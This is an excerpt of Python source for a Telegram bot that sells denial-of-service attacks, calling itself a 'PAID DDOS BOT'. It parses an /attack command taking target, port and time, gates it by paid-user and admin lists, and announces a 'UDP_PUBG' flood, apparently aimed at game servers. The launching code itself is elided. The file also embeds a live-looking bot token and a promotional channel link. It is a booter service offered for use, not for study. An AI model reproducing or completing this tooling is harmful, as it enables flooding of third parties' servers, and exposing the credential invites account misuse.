...
bot = telebot.TeleBot('7117401120:AAGvKnL9QOACXTrHUM31DSjfFzUoJuOgYY8')
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: UDP_PUBG\nJOIN:-@https://t.me/+FNSuUm4X6E5jOWFl"
    bot.reply_to(message, response)
...
def handle_attack(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in attack_cooldown and (datetime.datetime.now() - attack_cooldown[user_id]).seconds < 0:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 5000:
                ...
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function.  running_processes = []
            ...
            response = "Usage :- /attack <target> <port> <time>\n@KRISHNAVIPOWNER"  # Updated command syntax
    else:
...
def welcome_start(message):
    ...
    response = f"WELCOME TO PAID DDOS BOT "
    bot.reply_to(message, response)
